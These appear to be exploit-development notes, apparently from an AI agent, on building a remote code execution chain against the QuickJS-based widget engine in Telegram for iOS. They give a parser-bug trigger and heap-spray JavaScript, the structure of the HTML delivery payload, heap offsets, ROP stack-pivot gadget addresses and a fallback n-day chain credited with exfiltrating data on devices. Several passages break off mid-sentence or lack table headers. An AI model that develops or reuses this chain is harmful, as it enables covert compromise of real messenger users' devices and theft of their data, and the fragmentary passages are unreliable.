## 0. Verdict (short)

1. **A real 0day iOS-capable chain now exists at the host level.**
   The unreported parser bug (`ARG_SCOPE_END`, `function f([] = eval("("))`)
   plus a new allocator trick — **hole-reuse spray**: free a same-size run
   inside the spray, then compile `f` so its `JSFunctionBytecode` `b` is
   allocated **inside** that run — makes the fixed far-OOB read at
   `b + 1,311,372` land in a live spray block. The fake `JSVarDef` pair
   overflows the 56-byte class-64 closure array and sets a victim
   `ArrayBuffer(72).byteLength = 327,744`. The existing iOS same-view stage B
   (scan class-24 view → `u.array.count = 0x7fffffff` → `u.ptr` re-point →
   `rt`/`mf.js_free` → Mach-O base → `printf` proof) then runs unchanged.
   Host: stage A **5/5**, stage A + host twin **5/5** (`N1HOST_OK`), full
   stage A+stage B widget **5,581 raw / 2,355 zlib9** (fits 32,768/4,096).
   **Device (6s, 2026-11-08): `hole_stageA_probe_h400.html` hit —
   `HIT=545 LEN=327744 PH=36 VK=598 NT=21`** (screenshot
   `lab/ios_way/evidence/ios_h400_probe_HIT_20261108.png`). The old final
   missed/crashed because its second executable `<script>` shifted the
   pre-stage-A heap. The `text/plain` final-shaped layout was then tested and
   **failed on the device** (fresh-process parser-stage crash, fault
   `0x1310ace38`): the engine parses/atomizes `text/plain` content before
   stage A. The **attribute variant** (§3.6) keeps stage B in a `data-s2`
   attribute, with probe/final raw HTML byte-size identical and stage B read
   only after the forge; it is the current preferred candidate.
2. **The hole trick is what fixes the iOS "97 MB gap".** In the previous
   design `b` was allocated at script compile, *before* the runtime spray;
   the +1.31 MB target therefore fell past/between Apple's tiny-zone
   regions. With the hole trick `b` is *inside* the spray's own address
   range, so the target is in the spray's span, not in a region gap. The
   predicted Apple tiny-class geometry is deterministic:
   `fsize = 957` (C=34 float terms) → request 965 → 16-byte class **976**;
   `vardefs = b+672`; `T = b+1,311,372`; `q = ((T+8) mod 976) − 8 = 604`
   (phase 4). The A/B record ends at 636 < 957, fully inside controlled
   data. The old 35-float payload (`fsize 976`, class **992**, `q=956`) has
   the B record start at 976 — the zero tail of the block — so it is
   **structurally F=1**, not F=2; this is a concrete explanation for the
   16 device renders that produced 0 hits/NOCORR/crashes with the old
   universal probe.
3. **Same-allocation giant-bytecode variant: negative.** Making `b` itself
   >1.31 MB (a ~440 KB source of `0,0,...`, 220 k array elements) compiles
   the target into `b`'s own bytecode, but the host peak is **10,477,464 B**
   at the 16 MiB limit and it is **OOM-killed at 8 MiB**. Rejected for iOS
   (8 MiB).
4. **Small-`b` arena variant (route 2 on the iOS 4 KiB arena): negative on
   the host.** The target at `b+1,310,828` landed in a foreign class-40
   arena page, not in the class-352 spray; the 4 KiB arena stream is
   dominated by the per-object class pages. The 64 KiB-slab Android route 2
   remains the MTE-on Android form, not an iOS form.
5. **The v7/#1827 n-day is a real full iOS RCE fallback, but it is an
   n-day.** quickjs-ng PR #1827 ("Fix RegExp deletion bytecode lifetime",
   public Oct 15 2026, commit `3d5cb14`) is **not** in v0.17.0 or even
   v0.18.0 (it is a post-0.18.0 master commit), so the app is vulnerable;
   but the fix is public, so it does not satisfy the 0day requirement. The
   same-view BigInt primitive + the plain `mov sp,x0; ret` pivot is proven
   on the 17e stock app (3,039 B exfil) and on the 6s (RCE_OK/DB); PAC is
   not the blocker (app code is arm64; the pivot is a plain ret; MIE is off
   for the app). Use it only if the user accepts the n-day tradeoff.
6. **The same byte-identical payload across MTE-on Android + iOS is still
   not established.** The parser bug is shared; the iOS geometry is this
   hole-reuse malloc form (tag 0, no MIE), the Android MTE-on form is route 2
   (arena `b` + class-512 spray in 64 KiB slabs). Same bug, different
   geometry/endgame.

The host engine is `/tmp/opencode/qjs017` (v0.17.0 tag, `app_multi`), plus a
light instrumented build `/tmp/opencode/q17u/build/app_acv` (ACV prints;
not part of the payload). The iOS 13.2 `TelegramUIFramework` disassembly

`closure_var_count +0x42`, 8-byte `JSClosureVar` stride, 20-byte
`JSVarDef` stride, `scope_level +4`, `scope_next +8`.

Measured for the trigger `function f([] = eval("(")) { var q1,q2,q3;
return <C × 1.5>; }`:

|---:|---:|---:|---:|---:|---:|---:|
| **34** | **957** | **34** | **672** | **1,311,372** | **976** | **604 (phase 4)** |
| 35 (old) | 976 | 35 | 688 | 1,311,388 | 992 | 956 (phase 36, **B tail zero**) |

| 30 | 881 | 30 | 608 | 1,311,308 | 896 | 460 (phase 20) |

Corrections to the earlier iOS note:

* `sizeof(JSFunctionBytecode)` is **128** (not 608 as a constant); `vardefs`
  is at `b + 128 + 16*cpool_count`. The old note's `b+608` is only the
  C=30 case (128+480). Its target `b+1,311,308` is the C=30 value, not the
  35-float value. The 35-float `f` has C=35 → vardefs `b+688` → target
  `b+1,311,388` (the device crash frame `x11−x25 = 1,311,408` is consistent
  with this plus a 20-byte argument-index offset).
* The old "Apple class 1024" is **not** the tiny-zone class for a 984-byte
  request. Apple's tiny zone uses 16-byte quanta (max 1008): 984 → **992**,
  and the old payload's q=956 puts the second fake record in the zero tail
  (bytes 976..991), i.e. **F=1**, not F=2. C=34 (request 965 → class 976,
  q=604) is the fix. If a future iOS uses a power-of-two small class 1024
  for the same request, C=34 still gives q=652 (phase 12), also inside the
  957-byte data. C=34 is the robust choice.
* The trigger f is compiled at runtime by `(0,eval)('"use strict";(function
  ([] = eval("(")) {...})')`. With the strict source, the compiled function
  has `argc=1, varc=6, cvc=0, count=7` (measured), so the closure array is
  56 B → class 64, matching `sizeof(JSArrayBuffer)=56`. The direct-eval
  wrapper without `"use strict"` gives varc=9/count=10 (class 80), which
  cannot reach the class-64 AB; keep the strict wrapper.
* The `tops` gate (`globalThis.PAT === PAT`) must stay: if the widget engine
  wraps the script in an eval, the function geometry changes and the chain
  must not run. The probe reports `RESULT NO_TOPS` and stops.

Tag/MIE/PAC domain for this chain: iOS 15.8.8 has no MTE/MIE and the app is
arm64 (no PAC); iOS 27 stock has no MIE entitlement and the app code is
arm64. The primitive touches only malloc'd/JS-heap data (tag 0) and the
existing stage B accesses `rt`/`mf` as full 64-bit values. It is **not** a
same-tag arena primitive for MTE-on Android: under MTE the parser's
`b` would be a tagged Scudo allocation, so this malloc geometry is iOS-only.
Route 2 (arena `b` + class-512 arena spray) remains the Android MTE-on
form.

## 2. The hole-reuse stage A (host-proven)

### 2.1 Construction (exact)

Payload source parameters: `C=34`, `SZ=957`, `N=3000`, `H∈{64,100}`,
`HN=64`, victim base `VK=598`, phase sweep `{4,12,20,28,36}`, victim sweep
`{598,588,578,568,558}` with an 8-block strided free.

```js
"use strict";
var PAT = [0,0,0,0, 1,0,0,0, 255,255,0,0, 255,255,255,255, 255,255,255,255,
           255,255,255,255, 1,0,0,0, 255,255,255,255, 255,255,255,255,
           255,255,255,255];                    // A @0, B @20 (40 B)
var S = new Array(3000);
for (i=0;i<3000;i++) S[i] = new Uint8Array(957);      // same class as b
for (k=0;k<64;k++) S[H+k] = null;                     // the holes
globalThis.f = (0, eval)('"use strict";(function ([] = eval("(")) {'
  + ' var q1=0,q2=0,q3=0; return ' + '1.5+'.repeat(33) + '1.5; })');
// f's b (=957 B request, class 976) reuses one of the freed holes
// victims: D 800×ArrayBuffer(64); T 600×ArrayBuffer(72)+TV views
// per phase: fill every live S[i] with PAT at p+40k; per victim run:
//   free T[v],TV[v],T[v-2],...,T[v-14]; call f(); scan T for byteLength!=72
```

Why `b` takes a hole: the spray data blocks and `b` are both
`js_calloc(965)` → the same Apple tiny class 976 (on the host build, same
glibc large-block size). The 64 freed holes are at the head of the class
free list (LIFO); the compile's class-976 allocations consume them and `b`
takes one. The target `b+1,311,372` is then 1,343 class-976 blocks ahead
(q=604), inside the still-live spray if `N` covers `hole+1343`.

### 2.3 Why this is a 0day and not the n-day

The bug is the **parser `ARG_SCOPE_END`** bug (unreported in quickjs-ng and
in the app; the c2560s parser 0day family). The endgame stage B is the
same-view BigInt technique; that technique is not the bug. The v7/#1827
RegExp UAF is *not* used in stage A. The chain therefore satisfies the
"0day bug + controllable primitive" requirement at the host level; the
remaining step is the device confirmation of the malloc geometry.

### 3.5.2 The final miss: exact cause

The probe and the old final had a **byte-identical stage A script** (1,805
chars), but the old final added a **second executable `<script>`** with the
3,617-char stage B (`if(globalThis.AB){...}`). The engine collects/compiles
the document's scripts before running stage A (or allocates their source /
script objects in the same pre-heap); the 3.6 KB stage-B source and its
bytecode consume class-976/other blocks and shift the class-976 free list,
so `b` takes a different hole and the fixed target moves relative to the
spray. The stage A marker then reports a safe miss, or the target leaves the
spray and the parser-stage faults. The H=400 probe's geometry therefore does
not transfer to the old final.

This is a **pre-stage-A heap** effect, not a bug in stage A or in the
closure overflow: the H=400 probe hit, the H=400 final missed, and the old
final H=64 crashed — exactly the expected behavior when the pre-heap (and
therefore the `b` hole / target block) shifts.

The mechanism is the executable script's **compilation**, not merely its
text length: the engine allocates a top-level `JSFunctionBytecode` (plus
inner functions/bytecode buffers) for the second script in the pre-heap;
that allocation consumes class-976/other blocks and/or fragments the
allocation stream, so `b` takes a different hole and the +1,311,372 target
lands in a gap or a foreign page. A same-length **string** alone does not
shift the geometry (the host inert/stageB/twin matrix proves this); a
same-length **compiled script** does. The `text/plain` block is not
compiled, and stage A evals it only after the forge, so the pre-heap is
length-neutral and the probe's H transfers.

### 3.5.3 Final-shaped fix: stage B in `text/plain`, evaled after the forge

The new layout makes probe and final **byte-identical at the HTML level
except the s2 text bytes, which have the same length**:

```html
<div id="v">N1IOS_HOLE</div>
<script>STAGE_A</script>
<script type="text/plain" id="s2">S2_TEXT</script>
```

* `STAGE_A` is the same source in probe and final (including the final
  `try{var s2=document.getElementById("s2"); if(hit>=0 && s2){(0,eval)(s2.textContent);}}catch(e){}`).
* Probe `S2_TEXT` = a valid JS comment of **exactly the stage-B byte length**
  (3,617 bytes); final `S2_TEXT` = the real stage B (3,617 bytes).
* The engine does not execute `type="text/plain"`; the text is a DOM text
  node. Stage A reads and evals it **after** the forge, so the pre-stage-A
  heap is the same in probe and final (the text is not compiled before stage

### 3.6.22 Device `U_RDY` without `rce.txt`: the arm never ran (`d` alias shadowed)

The H150 run on the 6s printed
`U_RDY 0x114ebb608 D=0x11a83ce10 DL=0x5981808 O=+0x2f20 PATH=…`, the app
stayed alive (PID 9036) and `rce.txt` kept its 2026-11-05 mtime. `U_AFTER`
never appeared, which means the ROP did not return from `TRIG = null`.

**Root cause (found on the host):** the inline IIFE alias list was
`var T=B,S=F,d=U,b=D,…` while the ROP body itself declares `var U=0n`
(the leaked UB data pointer, used by the scan and the chain). `var` hoisting
makes `U` a function-scope local, so the alias `d=U` read **undefined**
instead of `globalThis.U` (the stage B runtime). The arm's first statement
`var RT_FREE=d+16n` therefore threw `TypeError: cannot convert BigInt to
number`; the stage A's `catch(e3){}` swallowed it, so `#v` stayed `U_RDY`,
the app stayed alive and no file was written. **The pivot was never armed and
`TRIG=null` was never reached.** (The host harness never caught it because
`if(HOSTCFG){return;}` sits before the arm and terser deletes the dead arm.)

**Fix:** the alias now reads the property explicitly — `d=globalThis.U` —
immune to any local `U`; the U_RDY line prints `RT=<d>` so the device run
proves the fix (`RT=0x103f…`).

## 4. Negative results (measured, kept as dead ends)

### 4.1 Giant-bytecode same-allocation (rejected)

Make `b` >1.31 MB by compiling `f` with a ~440 KB `0,0,...` array literal
(220 k elements); the target is then inside `b`'s own bytecode and the fake
record can be a trampoline into the array-literal bytes. Host:
`bclen=1,319,893`, `bcoff=268`, target `b+1,310,828`, target inside `b`.
But the compile peak is **10,477,464 B** (measured at 16 MiB; the peak is
the parser/resolve bytecode buffers plus the 35-entry/220 k cpool), and at
the real 8 MiB limit the eval is **`InternalError: out of memory`** before
`b` is created. Even the `null` and `!0` literal variants peak at
11.8/12.2 MB. Rejected for iOS; the same-allocation idea is sound but needs
an engine with a >11 MB compile budget.

### 4.2 Small-`b` (class-352 arena) hole variant (rejected on the host)

`f` without floats (`fsize 313`, class 352) + `Uint8Array(344)` spray holes:
the target `b+1,310,828` landed in a **class-40** arena page
(`ar=0x...922ab0`, block 79, q=36), not in the class-352 spray. The 4 KiB
arena stream is dominated by the per-object class pages; the class-352
spray does not cover the address window. This is the iOS form of route 2;
it is not viable on the v0.17.0 4 KiB arena without a slab-like allocator.
Route 2's Android 64 KiB-slab form is unchanged.

### 4.4 Multi-H in one widget (rejected for stability)

A single widget that sweeps H∈{64,100,200,400} (freeing a 128-block hole run
per H, compiling a fresh `f`, then the phase/victim sweep) hit 5/5 on the
host at H=64/PH=4/NT=1, but the stage A **segfaults at runtime cleanup**
(`JS_FreeRuntime`, rc=139) after the hit: the low victim base (16) and the
run of class-64 frees leave the arena free list corrupted when the overflow
writes into a free block/header. The single-H payloads with victim base 598
exit cleanly (rc=0). Use separate H widgets (the four probe/final variants),
not a multi-H payload.

### 4.3 Other inventory primitives on iOS

* N1 (`push_scope` OOM) is fatal on iOS: the OOM throw crashes the process
  in the C++ exception bridge (device `.ips`, independent of the
  `InternalError.prototype.name` getter). Do not deliver N1 probes.
* C2 (`update_var_htab` mask after failed realloc) is OOM-gated and has no
  iOS endgame.
* F1 is a read-only stale-bytecode leak (engine-shared); no write.
* FR/MB-01/MB-02 are DoS-only (no reclaim in the free→read gap).
* LT (litehtml table span) is clamped in the shipped iOS 13.2 build.

## 5. v7/#1827 n-day fallback — honest assessment

This is the only path with a **device-proven full iOS RCE today**, and it is
not the goal; it is the declared fallback.

* Status: quickjs-ng PR #1827 is public (opened 2026-10-15, fix commit
  `3d5cb14`), and the fix is **not** in v0.17.0 (the app) nor in v0.18.0
  (tagged 2026-11-01); it is a post-0.18.0 master commit. The app is
  vulnerable, but the bug is an n-day by the public-fix definition.
* Primitive: freed RegExp bytecode reclaimed by an `ArrayBuffer` data block
  in the same arena class; a fake `REOP_set_i32` writes the victim AB
  `byte_length`; a `BigInt64Array`/`BigUint64Array` pair gives `rd64/wr64`
  and re-points its own `u.ptr` (same-view, tag-preserving).
* iOS endgame: `rt->mf.js_free := printf` for the proof; the full ROP uses
  `rt->mf.js_malloc_usable_size` as the stack pivot. The pivot is a plain
  `mov sp,x0; ret`:
  * 6s/iOS 15.8.8: `libcFree − 0x66cccfc` (JSC+0x3a0ee8), device-proven;
  * 17e/iOS 27.0: `libcFree + 0xB6583074` = IntelligenceFlowRuntime+0x64510,
    bytes `1f 00 00 91 c0 03 5f d6`, used by the stock PoC that exfiltrated
    3,039 B; the plain `ret` does not authenticate `x30`, so PAC does not
    block it; MIE is off for the stock app (no `checked_allocations` /
    `enhanced_security` / `hardened_*` entitlements).
* Tradeoff: full RCE/file/network in the app sandbox, same payload style on
  both iOS versions, but n-day; a future app update can ship the fix. The
  parser hole-reuse chain is the 0day answer, pending the device run.

## 6. Native iOS surface audit (broadening pass)

The shipped `TelegramUIFramework` is a native `wr::WidgetContainer` C++ DOM
on QuickJS, laid out by a litehtml fork and drawn by CoreGraphics
(`WidgetRuntime: a C++ DOM on QuickJS (quickjs-ng fork), laid out by
twidget's litehtml fork, drawn by CoreGraphics`; symbols
`wr::WidgetContainer`, `wr::ios::CoreTextRenderHost`, `wr::LayerTree`,
`wr::HostState::queueData(JSContext*, twidget::sdk::CheckedWidgetData)`,
`wr::WidgetContainer::draw_filtered(unsigned long, litehtml::filter_paint
const&, ...)`, `litehtml::parse_media_query_list`, the litehtml element
classes, `LiteHTMLFilters`).

What was checked in this pass (static, host-only):

* Strings/symbols in the 122,824,000-byte binary: litehtml HTML/CSS/filter
  surface, `wr::` DOM/LayerTree, `twidget::sdk`, CoreText render host. The
  `CanvasRenderingContext2D`/`HTMLCanvasElement`/`OffscreenCanvas` strings
  in the binary are **not** the widget's canvas: the widget's drawing path
  is `wr::WidgetContainer::draw_filtered` + `litehtml::filter_paint` +
  CoreGraphics. They likely belong to Telegram's RichTextEditor/in-app
  browser components and are not reached by the widget.
* The Android native audit (`notes/twidget_native_audit.md`) found the
  Telegram `twidget` filter/canvas/DOM code defensive; the iOS litehtml is
  the same family but a different build. The known litehtml table-span bug
  is clamped in the iOS 13.2 binary (`notes/rce_candidate_lt_20261108.md`),
  so LT is not a candidate.
* New native candidates considered but **not** proven:
  `innerHTML`/DOM node lifetime vs retained JS wrappers (a C++ UAF would be
  same-tag/non-OOM and ideal), `wr::HostState::queueData` /
  `CheckedWidgetData` type confusion, `LayerTree`/canvas op-stream bounds,
  litehtml `filter_paint`/`draw_filtered` coordinate arithmetic. None has a
  concrete bug yet; the next step is a focused IDA pass on
  `wr::WidgetContainer` and the litehtml filter/table/grid code, plus a
  small grammar/HTML fuzz of the widget DOM (see §8).
* The iOS native surface is **not** WebKit/JSC: the widget engine is
  QuickJS. The public WebKit/JSC CVEs (DarkSword/Coruna etc.) do not apply
  to this widget path; only their techniques transfer (plain-ret pivot,
  GOT-resolved calls, data-only hooks). MIE is hardware-only on iPhone 17
  and not app-opted-in; no MIE bypass is needed for the stock app.

**Vendor-copy native harness.** The lab has the Telegram release-13.2
litehtml vendor copy (`lab/rce_candidates/lt/src/litehtml_telegram`,
`tgwidget-src` tag `release-13.2`, commit `24638bc`). It was built here with
ASan/UBSan (`build/telegram_asan/lt_harness`; the 36-seed corpus renders
cleanly). The quick single-worker mutation fuzz (3 min, HTML/CSS templates +
token/number/attribute mutations, 3 s per input) produced **no ASan/UBSan
crash** (1,582 execs; log in
`lab/ios_way/evidence/lt_fuzz_seed1_3min.log`). The
grid-line parser clamps to `[-1000,1000]` (`parse_grid_placement`,
`css_effects.cpp:1232`), the table spans are clamped, and the SVG path
parser uses a bounded `v[7]` with fixed-size reads. This closes the most
obvious integer-index paths in the vendor litehtml; a longer, structured
fuzz (see §8) is needed for the parser/layout surface.

No new native memory-corruption primitive was found in this pass. The
parser hole-reuse chain is the concrete 0day candidate; the native DOM
remains the best long-term surface.
